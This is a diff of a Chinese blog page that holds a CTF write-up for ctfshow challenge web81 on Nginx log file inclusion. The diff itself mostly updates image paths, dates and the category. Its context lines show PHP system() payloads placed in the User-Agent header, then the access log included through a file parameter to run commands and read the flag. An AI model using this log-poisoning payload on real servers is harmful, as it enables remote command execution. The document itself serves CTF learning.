@@ -26,15 +26,15 @@
 <meta property="og:site_name" content="(๑´ڡ&#96;๑)">
 <meta property="og:description" content="题目源码 1234567891011121314151617181920212223 &lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 15:51:31# @email:">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://yschen20.github.io/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/250519202044085.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/250519201327703.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/250519201422397.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/05/25/web81-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250519202044085.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/05/25/web81-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250519201327703.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/05/25/web81-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250519201422397.png">
 <meta property="article:published_time" content="2025-05-25T01:08:08.000Z">
-<meta property="article:modified_time" content="2025-05-25T01:08:29.372Z">
+<meta property="article:modified_time" content="2025-05-29T04:30:00.223Z">
 <meta property="article:author" content="Suzen">
 <meta property="article:tag" content="文件包含 日志文件包含">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://yschen20.github.io/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/250519202044085.png">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/05/25/web81-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250519202044085.png">
 <meta name="twitter:creator" content="@Suzen">
   
   
@@ -296,7 +296,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2025-05-25T09:08:29+08:00
+                    本文最后更新于 2025-05-29T12:30:00+08:00
                   
                   
 
@@ -314,15 +314,15 @@
 <p>日志文件是服务器用来记录各种操作和访问信息的文件，比如网站服务器会记录用户的访问请求、来源地址、使用的浏览器信息等。如果攻击者能够在发送给网站的请求（比如网址、用户代理信息等）中插入恶意代码，这些代码就会被服务器记录到日志文件中。当服务器后续读取或处理这些日志文件时，如果存在漏洞，恶意代码就可能被当作正常的代码执行，从而实现攻击目的，比如获取服务器的控制权</p>
 </blockquote>
 <p>服务器是Nginx的</p>
-<p><img src="/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/250519202044085.png" srcset="/img/loading.gif" lazyload alt="image-20250519202044085"></p>
+<p><img src="/2025/05/25/web81-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250519202044085.png" srcset="/img/loading.gif" lazyload alt="image-20250519202044085"></p>
 <p>可以进行日志文件包含，在<code>User-Agent</code>中写入恶意命令，然后包含日志文件从而得到命令的回显</p>
 <p>Nginx默认日志路径是<code>/var/log/nginx/access.log</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent: <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><br>?file=/<span class="hljs-keyword">var</span>/log/nginx/access.log<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/250519201327703.png" srcset="/img/loading.gif" lazyload alt="image-20250519201327703"></p>
+<p><img src="/2025/05/25/web81-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250519201327703.png" srcset="/img/loading.gif" lazyload alt="image-20250519201327703"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent: <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl0g.php&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><br>?file=/<span class="hljs-keyword">var</span>/log/nginx/access.log<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/250519201422397.png" srcset="/img/loading.gif" lazyload alt="image-20250519201422397"></p>
+<p><img src="/2025/05/25/web81-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250519201422397.png" srcset="/img/loading.gif" lazyload alt="image-20250519201422397"></p>
 
                 
               </div>
@@ -341,8 +341,15 @@
     
       <span class="category-chain">
         
-  <a href="/categories/ctfshow%E5%88%B7%E9%A2%98/" class="category-chain-item">ctfshow刷题</a>
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" class="category-chain-item">漏洞笔记</a>
   
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="category-chain-item">文件包含</a>
+  
+  
+
   
 
       </span>
@@ -387,7 +394,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年5月25日</div>
+          <div>2025年5月29日</div>
         </div>
       
       
